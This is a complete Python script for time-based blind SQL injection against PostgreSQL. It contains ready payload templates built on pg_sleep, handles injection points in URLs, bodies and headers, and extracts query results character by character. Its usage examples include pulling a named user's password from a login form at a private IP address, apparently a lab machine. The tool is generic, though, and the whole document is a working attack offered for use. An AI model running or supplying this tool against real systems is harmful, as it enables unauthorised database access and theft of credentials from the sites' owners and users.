#!/usr/bin/env python3
"""
pg_time_blind.py - Generic PostgreSQL time-based blind SQLi extractor.

Works against ANY PostgreSQL target with a time-based injection, regardless of:
  - HTTP method (GET / POST / anything)
  - where the injection lives (URL, body, or a header)
  - parameter name
  - injection context (stacked, AND, OR, numeric) via --preset / --template

It does NOT depend on sqlmap. Per character it does a binary search on the
ASCII value (~7 requests/char) instead of trying all 95 printable chars.

----------------------------------------------------------------------
HOW IT WORKS
  You mark the injection point with a placeholder (default: INJECT).
  The tool replaces that marker with a payload built from a template that
  contains {cond} (a true/false condition) and {sleep} (seconds to sleep).
  If the response is slow -> condition was TRUE.  Binary search does the rest.

----------------------------------------------------------------------
EXAMPLES

1) The SSHControl login form (POST body, stacked query):
   python3 pg_time_blind.py \
     -u http://192.168.136.89:3000/login \
     -d "username=INJECT&password=test" \
     --query "SELECT password FROM users WHERE username='antwon'"

2) Re-use a saved raw HTTP request file (put INJECT where the payload goes):
   python3 pg_time_blind.py --request req.txt \
     --query "SELECT current_user"

3) GET parameter, numeric AND context:
   python3 pg_time_blind.py \
     -u "http://target/item?id=INJECT" --preset and-num \
     --query "SELECT version()"

4) Custom template (full control). {cond} and {sleep} are substituted:
   python3 pg_time_blind.py -u http://t/x -d "q=INJECT" \
     --template "1)) AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1-- -" \
     --query "SELECT usename FROM pg_user LIMIT 1"
----------------------------------------------------------------------
"""
import sys, time, argparse, urllib.parse
import requests

requests.packages.urllib3.disable_warnings()

# Pre-built payload templates. {cond} = boolean condition, {sleep} = seconds.
PRESETS = {
    # string context, stacked query (Postgres allows ';'):  foo'<HERE>
    "stacked":  "';SELECT pg_sleep({sleep}) WHERE {cond}--",
    # string context, boolean AND:  foo'<HERE>
    "and":      "' AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--",
    # string context, boolean OR:   foo'<HERE>
    "or":       "' OR (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--",
    # numeric context, AND (no opening quote):  id=1<HERE>
    "and-num":  " AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--",
    # numeric context, OR:
    "or-num":   " OR (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--",
}


def parse_request_file(path, proto):
    """Parse a raw HTTP request file into (method, url, headers, body)."""
    raw = open(path, "r", encoding="utf-8", errors="ignore").read().replace("\r\n", "\n")
    head, _, body = raw.partition("\n\n")
    lines = head.split("\n")
    method, target, _ = (lines[0].split() + ["", "", ""])[:3]
    headers = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            headers[k.strip()] = v.strip()
    host = headers.get("Host", "")
    url = target if target.startswith("http") else f"{proto}://{host}{target}"
    return method, url, headers, body.rstrip("\n")


class Oracle:
    def __init__(self, a):
        self.a = a
        self.tpl = a.template or PRESETS[a.preset]
        self.count = 0
        if a.request:
            self.method, self.url, self.headers, self.data = parse_request_file(a.request, a.proto)
        else:
            self.url = a.url
            self.data = a.data
            self.headers = {}
            for h in (a.header or []):
                k, v = h.split(":", 1)
                self.headers[k.strip()] = v.strip()
            self.method = (a.method or ("POST" if a.data else "GET")).upper()
        self.proxies = {"http": a.proxy, "https": a.proxy} if a.proxy else None
        self.thresh = a.threshold if a.threshold else a.sleep * 0.6

    def _payload(self, cond):
        p = self.tpl.format(cond=cond, sleep=self.a.sleep)
        return urllib.parse.quote_plus(p) if self.a.encode else p

    def _put(self, s, payload):
        return s.replace(self.a.marker, payload) if s else s

    def fires(self, cond):
        """Send one request; return True if the sleep fired (response delayed)."""
        payload = self._payload(cond)
        url = self._put(self.url, payload)
        data = self._put(self.data, payload)
        headers = {k: self._put(v, payload) for k, v in self.headers.items()}
        # let requests set its own Content-Length / Host
        headers.pop("Content-Length", None)
        for attempt in range(self.a.retries + 1):
            self.count += 1
            t = time.time()
            try:
                requests.request(self.method, url, data=data, headers=headers,
                                  proxies=self.proxies, verify=False,
                                  timeout=self.a.sleep + 15, allow_redirects=False)
            except requests.exceptions.RequestException as e:
                print(f"\n[!] request error: {e}"); sys.exit(1)
            dt = time.time() - t
            slow = dt >= self.thresh
            # confirm positives once to beat network jitter
            if slow and attempt < self.a.retries:
                continue
            return slow
        return True

    def length(self, query):
        for n in range(1, self.a.maxlen + 1):
            if self.fires(f"length(({query}))={n}"):
                return n
        return None

    def char(self, query, pos):
        lo, hi = self.a.cmin, self.a.cmax
        while lo < hi:
            mid = (lo + hi) // 2
            if self.fires(f"ascii(substr(({query}),{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo)


def main():
    ap = argparse.ArgumentParser(description="Generic PostgreSQL time-based blind extractor")
    src = ap.add_argument_group("target (use -u/-d/-H  OR  --request)")
    src.add_argument("-u", "--url", help="URL (may contain the marker for GET injection)")
    src.add_argument("-d", "--data", help="request body (may contain the marker)")
    src.add_argument("-H", "--header", action="append", help="extra header 'Name: value' (repeatable; may contain marker)")
    src.add_argument("-X", "--method", help="HTTP method (default: POST if -d given else GET)")
    src.add_argument("--request", help="raw HTTP request file with the marker inside")
    src.add_argument("--proto", default="http", help="proto for --request file (default http)")

    inj = ap.add_argument_group("injection")
    inj.add_argument("--query", required=True, help="SQL scalar to extract, e.g. \"SELECT password FROM users WHERE username='bob'\"")
    inj.add_argument("--preset", default="stacked", choices=list(PRESETS), help="payload shape (default: stacked)")
    inj.add_argument("--template", help="custom payload template using {cond} and {sleep} (overrides --preset)")
    inj.add_argument("--marker", default="INJECT", help="placeholder string for the injection point (default INJECT)")
    inj.add_argument("--no-encode", dest="encode", action="store_false", help="do NOT url-encode the payload")

    tun = ap.add_argument_group("tuning")
    tun.add_argument("--sleep", type=float, default=3.0, help="pg_sleep seconds (default 3)")
    tun.add_argument("--threshold", type=float, default=0.0, help="seconds to count as 'slept' (default sleep*0.6)")
    tun.add_argument("--retries", type=int, default=1, help="re-confirm a positive N times to beat jitter (default 1)")
    tun.add_argument("--maxlen", type=int, default=64, help="max length to probe (default 64)")
    tun.add_argument("--cmin", type=int, default=32, help="min ASCII for binary search (default 32)")
    tun.add_argument("--cmax", type=int, default=126, help="max ASCII for binary search (default 126)")
    tun.add_argument("--proxy", help="e.g. http://127.0.0.1:8080")
    ap.set_defaults(encode=True)
    a = ap.parse_args()

    if not a.request and not a.url:
        ap.error("provide -u/--url (with -d/-H) or --request")

    o = Oracle(a)
    print(f"[*] target  : {o.method} {o.url}")
    print(f"[*] preset  : {'custom template' if a.template else a.preset}")
    print(f"[*] query   : {a.query}")
    print(f"[*] sleep={a.sleep}s threshold={o.thresh:.2f}s\n")

    # sanity check: a condition that is always TRUE should fire
    if not o.fires("1=1"):
        print("[!] baseline TRUE condition did NOT delay the response.")
        print("    -> wrong preset/context, wrong marker placement, or not injectable here.")
        sys.exit(1)
    print("[+] injection confirmed (TRUE condition delayed the response)\n")

    n = o.length(a.query)
    if n is None:
        print("[!] length not found (empty result, bad query, or maxlen too low)"); sys.exit(1)
    print(f"[+] length = {n}\n[*] extracting: ", end="", flush=True)

    out = []
    for pos in range(1, n + 1):
        c = o.char(a.query, pos)
        out.append(c)
        sys.stdout.write(c); sys.stdout.flush()
    print(f"\n\n[+] RESULT: {''.join(out)}")
    print(f"[*] total requests: {o.count}")


if __name__ == "__main__":
    main()
